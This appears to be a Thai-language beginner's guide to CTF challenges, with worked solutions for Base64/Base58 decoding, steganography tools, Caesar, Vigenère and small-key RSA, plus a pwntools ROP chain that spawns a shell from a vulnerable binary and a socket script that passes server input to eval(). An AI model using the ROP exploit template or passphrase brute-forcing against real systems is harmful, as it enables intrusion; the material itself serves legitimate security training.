Mindset และเครื่องมือพื้นฐานที่ควรมี ก่อนเริ่มเล่น CTF — สิ่งที่ทุกคนต้องเตรียม

วิธีคิดของผู้เล่น CTF
การเล่น CTF คือ การทดลอง — ถ้าวิธีหนึ่งไม่ได้ผลให้ลองอีกวิธี ไม่มีคำตอบเดียวที่ถูก เก็บเครื่องมือไว้ในกล่องเครื่องมือของตัวเอง แล้วเลือกใช้ตามลักษณะของไฟล์/รหัสที่เจอ

🧭 ขั้นตอนการวิเคราะห์โจทย์ (อ่านก่อนทุกครั้ง)

  1. อ่านชื่อโจทย์ — ชื่อมักเป็นคำใบ้ตรงๆ เช่น "Meta meta" = Metadata, "QRrrrr" = QR Code
  2. อ่าน Description/Hint — บรรทัดเดียวมักบอกประเภทของโจทย์ (Crypto, Stego, OSINT, ฯลฯ)
  3. ดูรูปแบบ Flag — เช่น THM{xxx_yyy_zzz} นับช่อง _ เพื่อกะความยาวคำตอบ
  4. ดูไฟล์แนบ — นามสกุลไฟล์ + ขนาด + ตรวจหัวไฟล์ (file signature)
  5. ลอง Tool พื้นฐานก่อน เสมอ — strings, binwalk, exiftool

Base64 Decode ถอดรหัสข้อความที่ลงท้ายด้วย == หรือ =

Cryptography / Encoding
โจทย์
คุณสามารถถอดรหัสข้อความต่อไปนี้ได้หรือไม่?
VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==

🔍 วิธีสังเกตว่าเป็น Base64

  • ลงท้ายด้วย = หรือ == (padding character)
  • มีแต่ตัวอักษร A-Z, a-z, 0-9, +, /
  • ความยาวเป็นจำนวนเท่าของ 4

💻 วิธีทำ (3 วิธี)

วิธีที่ 1: CyberChef

  1. เปิด CyberChef
  2. วางข้อความรหัสในช่อง Input (ขวาบน)
  3. ค้นหา From Base64 ในช่อง Operations แล้วลากมาช่อง Recipe
  4. ดูผลลัพธ์ในช่อง Output ทันที

วิธีที่ 2: Terminal Linux

echo "VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==" | base64 -d
# ผลลัพธ์: THM{ju57_d3c0d3_7h3_b453}

วิธีที่ 3: Python

python3 -c "import base64; print(base64.b64decode('VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==').decode())"
วิธีจำ Base64
"Base 64" = ใช้สัญลักษณ์ 64 ตัว (A-Z + a-z + 0-9 + + + /) แทน byte
เห็น == ท้ายข้อความ → ลอง Base64 ก่อนเป็นอันดับแรก เสมอ
รู้ไว้ใช่ว่า
Base64 ใช้กันแพร่หลายมาก เช่น embed รูปใน HTML (data:image/png;base64,...), เก็บไฟล์ใน JSON, Email attachment (MIME), JWT token ฯลฯ — คุ้นกับมันให้ดี

Steganography — มีบางอย่างซ่อนอยู่ การซ่อนข้อมูลภายในไฟล์อื่น (มักเป็นรูป/เสียง)

Forensics / Steganography
คำใบ้
"Something is hiding. That's all you need to know." — มีไฟล์/ข้อความซ่อนอยู่ในไฟล์ที่ได้มา

🌐 วิธีออนไลน์ที่แรง — Aperisolve

aperisolve.com รวมเครื่องมือยอดฮิตทั้งหมด (zsteg, steghide, outguess, binwalk, exiftool, foremost) มารุมวิเคราะห์ภาพในทีเดียว — อัปโหลด → รอ → อ่านผล

💻 วิธี Terminal (Professional)

# 1. ดู metadata ก่อน
exiftool secret.jpg

# 2. สแกนหาไฟล์ฝังตัว
binwalk secret.jpg
binwalk -e secret.jpg     # สกัดออกมา

# 3. ลอง steghide (สำหรับ JPG/BMP/WAV/AU)
steghide extract -sf secret.jpg
# จะถามรหัส (passphrase) → ลองกด Enter ก่อน, หรือลอง brute

# 4. zsteg (สำหรับ PNG/BMP โดยเฉพาะ - ตรวจ LSB)
sudo gem install zsteg
zsteg -a secret.png

# 5. ถ้า steghide ขอ password — ลอง brute ด้วย stegseek
stegseek secret.jpg /usr/share/wordlists/rockyou.txt
เทคนิคเสริม — LSB Steganography
LSB (Least Significant Bit) คือการซ่อนข้อมูลใน bit ที่มีค่าน้อยที่สุดของพิกเซล ทำให้ภาพดูปกติแต่จริงๆ มีข้อความซ่อน — ใช้ zsteg ตรวจสอบได้
วิธีจำ Steganography
Stego = "ปกปิด" (กรีก), graphy = "เขียน" → "เขียนแบบปกปิด"
ต่างจาก Crypto (เข้ารหัส) ตรงที่ Stego = ซ่อนว่าข้อความ มีอยู่, Crypto = แค่ทำให้อ่านไม่ออก

Oh, Oh — Base58 ญาติของ Base64 ที่ Bitcoin ใช้

Cryptography / Encoding
โจทย์
3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L

🔍 วิธีสังเกตว่าเป็น Base58

  • มีตัวอักษร A-Z, a-z, 0-9 แต่ ไม่มี 0 (ศูนย์), O (โอ), I (ไอใหญ่), l (แอลเล็ก) — เพื่อกันสับสน
  • ไม่มีเครื่องหมาย = ท้าย
  • ไม่มี + หรือ /

💻 วิธีทำ

CyberChef

  1. วางในช่อง Input
  2. ค้น From Base58 ลากมา Recipe
  3. หรือใช้ Magic ให้ CyberChef เดาให้อัตโนมัติ
เทคนิคเด็ด — Magic Operation
ถ้าไม่รู้ว่าเป็น encoding อะไร ลอง Magic ใน CyberChef — มัน brute-force ทดสอบ encoding นับสิบแบบให้ใน 1 คลิก

Python

pip install base58
python3 -c "import base58; print(base58.b58decode('3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L').decode())"
วิธีจำ Base58
Base58 = Base64 - 6 ตัวที่สับสน (0, O, I, l, +, /)
ถูกออกแบบโดย Satoshi Nakamoto ผู้สร้าง Bitcoin — ใช้กับ wallet address

Left or right — Caesar Cipher (ROT-x) รหัสที่เก่าแก่ที่สุดในประวัติศาสตร์ — เลื่อนตัวอักษร

Cryptography / Classic Cipher
โจทย์
MAF{atbe_max_vtxltk} — รูปแบบคำตอบ THM{...}

🧮 วิเคราะห์

ถ้าผลลัพธ์ต้องขึ้นต้นด้วย THM แต่รหัสเริ่มด้วย MAF:

  • M → T: นับจาก M ไป T = 7 ตำแหน่ง (M→N→O→P→Q→R→S→T)
  • ดังนั้น Shift = 7 (decrypt) หรือ -7 (encrypt)

💻 วิธีทำ

CyberChef

  1. วางข้อความใน Input
  2. ค้น ROT13 หรือ ROT13/47 หรือ Bacon Cipher หรือใช้ ROT13 Brute Force
  3. ปรับค่า Shift 1-25 จนเจอข้อความที่อ่านได้

dcode.fr (เร็วที่สุด — มี auto-solve)

dcode.fr/caesar-cipher — กดปุ่ม "Decrypt automatically" จะลองทุก shift ให้ดู

Terminal

# Caesar Cipher ทุก shift ใน 1 บรรทัด
for i in {1..25}; do
  echo "Shift $i: $(echo 'MAF{atbe_max_vtxltk}' | tr 'A-Za-z' "$(echo {a..z} | tr -d ' ' | cut -c$((26-i+1))-26)$(echo {a..z} | tr -d ' ' | cut -c1-$((26-i)))$(echo {A..Z} | tr -d ' ' | cut -c$((26-i+1))-26)$(echo {A..Z} | tr -d ' ' | cut -c1-$((26-i)))")"
done

# หรือใช้ python ง่ายกว่า
python3 -c "
import codecs
for i in range(26):
    print(f'Shift {i}:', ''.join(chr((ord(c)-ord(\"A\")-i)%26+ord(\"A\")) if c.isupper() else chr((ord(c)-ord(\"a\")-i)%26+ord(\"a\")) if c.islower() else c for c in 'MAF{atbe_max_vtxltk}'))
"
วิธีจำ Caesar Cipher
ROT13 = หมุน 13 ตัว (พิเศษเพราะ encrypt = decrypt — หมุน 2 ครั้งครบ 26 = กลับมาที่เดิม)
เคล็ดลับ: ถ้ารู้รูปแบบ Flag (THM, FLAG, CTF) → เทียบตัวแรกหา shift ทันที

I lost the key — Vigenère Cipher รหัสที่ใช้ "คำกุญแจ" มาเลื่อนตัวอักษร

โจทย์

Format: TRYHACKME{FLAG_IN_ALL_CAP}

🧮 หลักการ Vigenère

ใช้ คำกุญแจ (key) มาเลื่อนตัวอักษรทีละตัว — ต่างจาก Caesar ที่ใช้ shift เดียวกันทั้งหมด
เช่น Key = CAT (C=2, A=0, T=19), ข้อความ = DOG
→ D+2=F, O+0=O, G+19=Z → FOZ

💻 วิธีถอด (Known Plaintext Attack)

เมื่อรู้ส่วนหนึ่งของผลลัพธ์ — สามารถย้อนหา key ได้

dcode.fr — ใช้ feature "Knowing a plaintext word"

  1. เปิด dcode.fr/vigenere-cipher
  2. วาง ciphertext: MYKAHODTQ
  3. เลือก Decryption with KNOWN plaintext word
  4. ใส่ plaintext: TRYHACKME
  5. กด DECRYPT → จะได้ key

CyberChef

  1. วาง ciphertext ใน Input
  2. Operation: Vigenère Decode
  3. Key: ใส่ key ที่หาได้
ไม่รู้ key เลย? ใช้ Kasiski/Frequency Analysis
ถ้าข้อความยาวพอ (>100 ตัวอักษร) ใช้:
  • Kasiski Examination — หาความยาวของ key จากการซ้ำของ pattern
  • Index of Coincidence — วิเคราะห์ความถี่
  • เครื่องมือ: Boxentriq Vigenère Solver
วิธีจำ Vigenère

2.3 RSA แบบ Public Key หลุด (e, n เล็ก) 300 pts • ยาก
โจทย์
ได้ Public Key (n, e) และ ciphertext c — ถอดรหัส
n = 3233, e = 17, c = 2790
🐍 วิธีที่ 1 — Python + sympy
python3
>>> from sympy import factorint
>>> n = 3233
>>> e = 17
>>> c = 2790
>>> # 1. แยก n เป็น p*q (เพราะ n เล็ก)
>>> factors = factorint(n)   # {61: 1, 53: 1}
>>> p, q = list(factors.keys())
>>> # 2. คำนวณ phi(n) = (p-1)(q-1)
>>> phi = (p-1) * (q-1)
>>> # 3. หา d (modular inverse)
>>> d = pow(e, -1, phi)
>>> # 4. ถอดรหัส m = c^d mod n
>>> m = pow(c, d, n)
>>> print(m)   # = plaintext (number)
🌐 วิธีที่ 2 — เว็บ RSA Calculator
  • dcode.fr/rsa-cipher
  • factordb.com — สำหรับแยก factor ของ n ที่ใหญ่กว่านี้
จุดอ่อนของ RSA ที่ออกข้อสอบบ่อย
  1. n เล็กเกินไป → factorize ได้
  2. e เล็ก (e=3) + plaintext เล็ก → Cube Root Attack
  3. ใช้ p, q ใกล้กัน → Fermat's Factorization
  4. ใช้ n เดียวกัน 2 ครั้ง → Common Modulus Attack
รูปแบบคำตอบ: ตัวเลข plaintext หรือแปลงเป็น ASCII

6.3 Return-Oriented Programming (ROP) 300 pts • ยาก
โจทย์
Binary มี NX bit (ห้ามรัน shellcode) — ใช้ ROP chain เรียก system("/bin/sh")
🐧 วิธีที่ 1 — pwntools + ROPgadget
pip install pwntools
sudo apt install ropgadget

# 1. หา gadget
ROPgadget --binary vuln | grep "pop rdi"
0x00401203 : pop rdi ; ret

# 2. หา address ของ "/bin/sh" string
ROPgadget --binary vuln --string "/bin/sh"

# 3. หา address ของ system()
objdump -d vuln | grep system@plt

# 4. craft chain
python3 -c "
from pwn import *
p = process('./vuln')
payload = b'A'*40
payload += p64(0x401203)       # pop rdi ; ret
payload += p64(BINSH_ADDR)     # arg1
payload += p64(SYSTEM_ADDR)    # call system
p.sendline(payload)
p.interactive()
"
Protection ที่ต้อง bypass
  • NX/DEP = stack รัน code ไม่ได้ → ใช้ ROP
  • ASLR = address สุ่ม → leak address แล้วคำนวณ offset
  • Stack Canary = ค่าสุ่มกั้น return address → leak canary ก่อน
  • PIE = base address สุ่ม → ต้อง leak module base
ดูด้วย: checksec vuln
รูปแบบคำตอบ: cat flag.txt (หลังได้ shell)

8.3 โจทย์ Math/Logic ที่ต้องคำนวณซ้ำ 300 pts • ยาก
โจทย์

🐍 วิธีที่ 1 — pwntools (Socket Automation)
python3
>>> from pwn import *
>>> r = remote('target.thm', 1337)
>>> for i in range(100):
...     line = r.recvline().decode()
...     # line = "What is 23 + 78?"
...     question = line.split("What is ")[1].split("?")[0]
...     ans = eval(question)
...     r.sendline(str(ans).encode())
>>> r.interactive()
ระวัง — eval() อันตราย
eval() รัน Python code ตรงๆ — ในข้อสอบใช้ได้ แต่ในงานจริง ห้าม ใช้กับ user input เด็ดขาด (เปิด RCE)
pwntools — เครื่องมือสาย Pwn
  • process('./bin') — รัน local binary
  • remote('host', port) — เชื่อม network
  • r.recvuntil(b'$ ') — รอจนเจอ prompt
  • r.sendline(payload) — ส่งข้อมูล
  • p64() / p32() — pack address เป็น bytes
  • r.interactive() — สลับเป็นโหมดผู้ใช้
